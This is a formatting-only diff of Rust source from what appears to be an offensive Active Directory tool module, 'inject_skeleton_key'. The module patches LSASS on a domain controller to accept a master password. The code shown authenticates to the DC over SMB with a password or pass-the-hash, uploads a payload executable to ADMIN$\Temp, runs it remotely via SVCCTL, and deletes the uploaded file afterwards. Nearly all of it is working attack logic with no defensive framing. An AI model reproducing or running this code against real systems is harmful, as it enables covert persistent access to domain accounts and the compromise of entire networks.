@@ -1,4 +1,4 @@
-﻿//! Skeleton Key injection — patch LSASS on a DC to accept a master password.
+//! Skeleton Key injection — patch LSASS on a DC to accept a master password.
 //!
 //! # Attack Details
 //!
@@ -44,7 +44,10 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
     // Validate credentials and establish SMB session
     let smb = match (&config.password, &config.nt_hash) {
         (Some(pw), _) => {
-            info!("[skeleton] Connecting to {} via SMB (password)", config.dc_ip);
+            info!(
+                "[skeleton] Connecting to {} via SMB (password)",
+                config.dc_ip
+            );
             SmbSession::connect(&config.dc_ip, &config.domain, &config.username, pw)
                 .await
                 .map_err(|e| {
@@ -55,7 +58,10 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
                 })?
         }
         (None, Some(hash)) => {
-            info!("[skeleton] Connecting to {} via SMB (pass-the-hash)", config.dc_ip);
+            info!(
+                "[skeleton] Connecting to {} via SMB (pass-the-hash)",
+                config.dc_ip
+            );
             SmbSession::connect_with_hash(&config.dc_ip, &config.domain, &config.username, hash)
                 .await
                 .map_err(|e| {
@@ -100,7 +106,10 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         Some(payload_path) => {
             // Upload payload to ADMIN$\Temp\<random>.exe
             let remote_name = format!("Temp\\{:08x}.exe", rand::random::<u32>());
-            info!("[skeleton] Uploading {} → ADMIN$\\{}", payload_path, remote_name);
+            info!(
+                "[skeleton] Uploading {} → ADMIN$\\{}",
+                payload_path, remote_name
+            );
 
             smb.upload_file(payload_path, "ADMIN$", &remote_name)
                 .await
@@ -119,15 +128,20 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
             );
 
             info!("[skeleton] Executing skeleton key command via SVCCTL");
-            let out = exec_util::run_remote_command(&smb, &cmd).await.unwrap_or_else(|e| {
-                warn!("[skeleton] Command execution returned error (may be normal): {e}");
-                String::from("(no output captured)")
-            });
+            let out = exec_util::run_remote_command(&smb, &cmd)
+                .await
+                .unwrap_or_else(|e| {
+                    warn!("[skeleton] Command execution returned error (may be normal): {e}");
+                    String::from("(no output captured)")
+                });
 
             // Cleanup uploaded binary
             info!("[skeleton] Cleaning up uploaded payload");
             if let Err(e) = smb.delete_file("ADMIN$", &remote_name).await {
-                warn!("[skeleton] Could not delete payload from ADMIN$\\{}: {e}", remote_name);
+                warn!(
+                    "[skeleton] Could not delete payload from ADMIN$\\{}: {e}",
+                    remote_name
+                );
             }
 
             (out, true)
